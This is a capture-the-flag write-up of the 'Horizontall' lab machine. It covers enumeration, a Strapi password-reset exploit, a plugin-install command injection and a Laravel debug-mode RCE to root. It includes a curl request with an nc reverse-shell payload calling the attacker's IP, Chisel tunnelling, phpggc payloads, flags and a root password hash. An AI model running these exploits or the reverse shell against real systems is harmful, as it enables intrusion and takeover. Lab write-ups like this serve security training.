# Horizontall: StrAPI: Laravel

![Screen Shot 2022-02-05 at 07 38 56](https://user-images.githubusercontent.com/87259078/152648385-006b609c-4c01-4270-83ac-ddbf35501c1c.png)

# Synopsis

“Horizontall” is marked as easy difficulty machine which features multiple SSH and Nginx service. VHOST is enabled on the server and it is running Beta version of StraAPI application and it has multiple vulnerabilities. We gain access StrAPI application dashboard via exploiting a bug in access control and then gain shell access via plugin handler function vulnerability. An local web server with vulnerable laravel framework is running on target host, we forward that port to our attacking machine. We exploit that debug vulnerability to gain root shell.

# Skills Required

- Web Enumeration
- VHOST Enumeration

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up (0.25s latency).
Not shown: 65350 closed ports, 182 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
31337/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  2048 e5:7c:cf:8e:ea:e3:38:19:05:ab:33:3f:d3:6e:de:2e (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=8/30%Time=612C6DC9%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals three open ports on ubuntu server. HTTP is redirecting to a hostname. Let’s add that to our hosts file.

```
⛩\> sudo sh -c "echo '10.10.11.105  horizontall.htb' >> /etc/hosts"
```

Let’s look into the HTTP service.

![Screen Shot 2021-08-30 at 23.06.12.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/582548BC-49CA-4AD9-A150-C1862C8A47F4_2/Screen%20Shot%202021-08-30%20at%2023.06.12.png)

![Screen Shot 2021-08-30 at 23.06.45.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/EAD920F8-F7D3-4889-B974-7893283DA50D_2/Screen%20Shot%202021-08-30%20at%2023.06.45.png)

There’s nothing much information on the website, however, the source page has javascript links.

![Screen Shot 2021-08-30 at 23.08.29.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/42E55A8D-DC9C-4479-B4CE-77919B753572_2/Screen%20Shot%202021-08-30%20at%2023.08.29.png)

One of the JS link reveals the VHOST information. We can confirm that with gobuster vhost enumeration scanner.

### VHOST Scan

```
⛩\> gobuster vhost -u http://horizontall.htb -t 30 -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      30
[+] Wordlist:     /home/kali/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/08/31 06:15:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
```

Add this VHOST to your hosts file and access it via browser.

![Screen Shot 2021-08-30 at 23.27.14.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/03B6CB49-3DFC-43EB-B165-2BF47813D78B_2/Screen%20Shot%202021-08-30%20at%2023.27.14.png)

Just a welcome message. Let’s run gobuster on this to find directories.

```
⛩\> gobuster dir -u http://api-prod.horizontall.htb -t 30 -b 404 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/31 06:28:55 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
```

We got couple directories, let’s access them.

![Screen Shot 2021-08-30 at 23.29.57.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/96A030AF-8796-40A8-BDDA-F1A301DC78C2_2/Screen%20Shot%202021-08-30%20at%2023.29.57.png)

Admin directory redirects to login page of ‘Strapi’ application. Let’s find any directory under admin.

```
⛩\> python3 dirsearch.py -u http://api-prod.horizontall.htb/admin/ -i 200 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 43003

Output File: /home/kali/tools/dirsearch/reports/api-prod.horizontall.htb/-admin-_21-08-31_07-10-10.txt

Error Log: /home/kali/tools/dirsearch/logs/errors-21-08-31_07-10-10.log

Target: http://api-prod.horizontall.htb/admin/

[07:10:10] Starting:
[07:10:18] 200 -  144B  - /admin/init
[07:10:18] 200 -   90B  - /admin/layout
[07:11:07] 200 -   90B  - /admin/Layout

Task Completed
```

We got three subdirectories under admin. Let’s look into them.

![Screen Shot 2021-08-31 at 00.20.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/7447620F-CE81-4AA1-A469-E929C3FC3DFD_2/Screen%20Shot%202021-08-31%20at%2000.20.16.png)

We got the running application version and it’s beta. A quick google gives us information about vulnerabilities of this running version. CVE-2019-18818

[Snyk: Improper Access Control in strapi](https://snyk.io/vuln/SNYK-JS-STRAPI-480418)

A vulnerability exists in the password reset feature. The application will not ask current user/admin password to change. There are couple of blogs written based on this vulnerability.

> [https://cyberweek.ae/materials/2020/COMMSEC D1: The Art of Exploiting Logical Flaws in Web Applications.pdf](https://cyberweek.ae/materials/2020/COMMSEC%20D1%20-%20The%20Art%20of%20Exploiting%20Logical%20Flaws%20in%20Web%20Applications.pdf)

[Exploiting friends with CVE-2019-18818](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/)

The python code to change the password is available in above link.

# Initial Access

```
⛩\> python strapi_poc.py admin@horizontall.htb http://api-prod.horizontall.htb master1

[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response:
{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzk3MzEwLCJleHAiOjE2MzI5ODkzMTB9.0_Qr-B6HXYnoHxtf2n1KymbICCMRIvzix5mEVXXZYM4","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}
```

Let’s login with new creds.

![Screen Shot 2021-08-31 at 02.46.43.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/94554C4B-4352-4499-A25D-36BAC0606CAD_2/Screen%20Shot%202021-08-31%20at%2002.46.43.png)

This beta version is also vulnerable to remote code execution. CVE-2019-19609

[Remote code execution in Strapi](https://www.cybersecurity-help.cz/vdb/SB2019120606)

[https://bittherapy.net/post/strapi-framework-remote-code-execution/](https://bittherapy.net/post/strapi-framework-remote-code-execution/)

```
⛩\> curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNDAzODA4LCJleHAiOjE2MzI5OTU4MDh9.7Ucs08rDF8lnkP7xBdEHMgipcNRddw4jZ_MYcy3grxg' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.209 8001 >/tmp/f)\",\"port\":\"1337\"}' $'http://api-prod.horizontall.htb/admin/plugins/install' --proxy http://127.0.0.1:8080
```

Using curl we can pass the payload to get reverse connection. You can get JWT by exploiting CVE-2019-18818 vulnerability and you need to capture this curl request in Burp to modify missing parts of the request.

![Screen Shot 2021-08-31 at 03.00.22.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/5714E481-20FD-4EC1-901F-8DA5D5A5C2A3_2/Screen%20Shot%202021-08-31%20at%2003.00.22.png)

![Screen Shot 2021-08-31 at 03.00.45.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/09410D47-3023-43FA-809E-7E766A00C9E8_2/Screen%20Shot%202021-08-31%20at%2003.00.45.png)

As you can see, three characters were missing from the request. Make sure to run netcat listener to receive reverse connection.

```
⛩\> pwncat -l -p 8001
[09:55:24] Welcome to pwncat 🐈!                                                                                                                __main__.py:143
[09:55:51] received connection from 10.10.11.105:57480                                                                                               bind.py:57
[09:55:54] 0.0.0.0:8001: upgrading from /bin/dash to /bin/bash                                                                                   manager.py:502
[09:55:57] 10.10.11.105:57480: registered new host w/ db                                                                                         manager.py:502
(local) pwncat$
(remote) strapi@horizontall:/opt/strapi/myapi$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)

(remote) strapi@horizontall:/opt/strapi/myapi$ cat /home/developer/user.txt
24f38c263eb2820e67533c04310ca9b7
```

We got the shell access and we read the user flag.

# Privilege Escalation

```
(remote) strapi@horizontall:/opt/strapi/myapi$ netstat -lp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN      1856/node /usr/bin/
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -
```

Let’s forward port 8000 to our machine using Chisel.

```
⛩\> ./chisel server -p 9002 --reverse
2021/08/31 10:13:01 server: Reverse tunnelling enabled
2021/08/31 10:13:01 server: Fingerprint D6eGohM1RLnXNrOrVqwIFAy3/2uAJ9TMBHHxS0h0MLk=
2021/08/31 10:13:01 server: Listening on http://0.0.0.0:9002
```

On Kali Linux open up a port for reverse port forward using chisel. Now upload chisel binary to target machine and connect the server.

```
(remote) strapi@horizontall:/opt/strapi/myapi$ chmod +x chisel

(remote) strapi@horizontall:/opt/strapi/myapi$ ./chisel client 10.10.14.209:9002 R:8000:127.0.0.1:8000
2021/08/31 10:29:44 client: Connecting to ws://10.10.14.209:9002
2021/08/31 10:29:46 client: Connected (Latency 223.158535ms)
```

Access the forwarded port.

![Screen Shot 2021-08-31 at 03.17.05.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/B5CDBA83-3830-450E-A5CB-463860A569A2/E289A069-0A12-4822-9F96-FFD4DF597234_2/Screen%20Shot%202021-08-31%20at%2003.17.05.png)

Laravel is running and version is v8. Let’s find any POCs.

```
⛩\> searchsploit 'laravel 8'
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Laravel - 'Hash::make()' Password Truncation Security                                                                        | multiple/remote/39318.txt
Laravel 8.4.2 debug mode - Remote code execution                                                                             | php/webapps/49424.py
Laravel Log Viewer < 0.13.0 - Local File Download                                                                            | php/webapps/44343.py
Laravel Nova 3.7.0 - 'range' DoS                                                                                             | php/webapps/49198.txt
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                                                    | php/webapps/48166.txt
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                                           | php/webapps/46389.py
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Laravel debug mode is vulnerable to RCE.

[GitHub: ambionics/laravel-exploits: Exploit for CVE-2021-3129](https://github.com/ambionics/laravel-exploits)

For this POC to work, we need to clone first PHP GCC library to unserialize payloads.

```
⛩\> git clone https://github.com/ambionics/phpggc.git
Cloning into 'phpggc'...
remote: Enumerating objects: 2504, done.
remote: Counting objects: 100% (846/846), done.
remote: Compressing objects: 100% (471/471), done.
remote: Total 2504 (delta 331), reused 740 (delta 251), pack-reused 1658
Receiving objects: 100% (2504/2504), 379.20 KiB | 985.00 KiB/s, done.
Resolving deltas: 100% (973/973), done.

⛩\> ls
phpggc
```

Now clone this code inside PHP GGC directory.

[GitHub: ambionics/laravel-exploits: Exploit for CVE-2021-3129](https://github.com/ambionics/laravel-exploits)

```
⛩\> php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'id'

⛩\> python3 laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

Successfully we got a response. We can read root flag using the same method.

```
⛩\> php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'cat /root/root.txt'

⛩\> python3 laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
08cc6250536b07eb04731bab84a59ac3
--------------------------
+ Logs cleared
```

We got the root flag.

```
root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::
```

